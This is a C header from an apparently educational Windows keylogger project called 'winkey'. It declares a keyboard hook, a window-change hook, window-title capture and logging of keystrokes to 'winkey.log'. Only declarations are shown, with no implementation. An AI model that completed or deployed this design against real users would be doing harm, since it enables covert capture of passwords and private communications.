/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   winkey.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: marvin <marvin@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/09/22 08:33:20 by marvin            #+#    #+#             */
/*   Updated: 2025/09/22 08:33:20 by marvin           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef WINKEY_H
# define WINKEY_H

# define WIN32_LEAN_AND_MEAN
# define _CRT_SECURE_NO_WARNINGS
# include <windows.h>
# include <conio.h>
# include <winuser.h>
# include <stdio.h>
# include <stdint.h>
# include <stdlib.h>
# include <string.h>

# define WINDOW_TITLE_SIZE 256
# define KEYLOG_FILE "winkey.log"
# define KEY_BUFFER_SIZE 4096

typedef struct s_winkey {
	HHOOK 			keyboard_hook;
	HWINEVENTHOOK	window_hook;
	char			window_title[WINDOW_TITLE_SIZE];
	char			window_prev[WINDOW_TITLE_SIZE];
	char 			path[256];
	char			key_buffer[KEY_BUFFER_SIZE];
	char			window_start_time[64];
	FILE			*keylog;
}	t_winkey;

// Prototypes de fonctions
void getUtf8Char(int vkCode, char *buffer, size_t bufferSize);
void getCurrentWindowTitle(char *title, size_t size);
void flushLogFile(void);
void logAccumulatedKeys(void);
void logWindowChange(void);
void sendKeyToLogFile(int vkCode);
VOID CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event,
                          HWND hwnd, LONG idObject, LONG idChild,
                          DWORD dwEventThread, DWORD dwmsEventTime);
LRESULT CALLBACK keyhook_proc(int nCode, WPARAM wParam, LPARAM lParam);

#endif
